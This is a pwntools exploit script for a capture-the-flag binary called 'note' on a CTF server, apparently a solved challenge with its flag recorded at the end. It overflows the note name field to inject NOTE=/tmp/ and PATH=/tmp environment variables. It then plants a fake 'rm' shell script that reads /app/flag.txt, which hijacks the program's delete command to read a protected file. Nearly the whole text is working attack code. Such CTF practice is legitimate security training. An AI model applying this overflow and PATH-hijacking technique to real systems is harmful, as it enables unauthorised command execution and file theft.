
from pwn import *
import sys

context.terminal = ["konsole", "-e"]


binary = "./note"

if "remote" in sys.argv:
    sh = remote("challs.wreckctf.com", 31951)

else:
    sh = process(binary)

    if "gdb" in sys.argv:
        gdb.attach(sh, gdbscript="""
            break *get_name
            break *add_note+480
            continue
        """)


def add_note(name, msg):
    sh.recvuntil(b">")
    sh.sendline(b"1")
    sh.recvuntil(b":")
    sh.send(name)
    sh.recvuntil(b":")
    sh.sendline(str(len(msg)).encode('utf-8'))
    sh.recvuntil(b":")
    sh.sendline(msg)


def delete_notes():
    sh.recvuntil(b">")
    sh.sendline(b"4")


# flag in /app/flag.txt

# write bad rm to copy and read file
payload = b"rm".ljust(0x20, b"\x00") + \
    b"NOTE=/tmp/\x00"

copy_payload = b"""
#!/bin/sh

/usr/bin/cat /app/flag.txt
"""
add_note(payload, copy_payload)

# pivot path var
payload = b"blah".ljust(0x20, b"\x00") + \
    b"PATH=/tmp\x00"
add_note(payload, b"pivot")

# trigger notes delete
delete_notes()

sh.interactive()

# flag{1120488ca87d02ca4e5e6fd7e2a52b15}
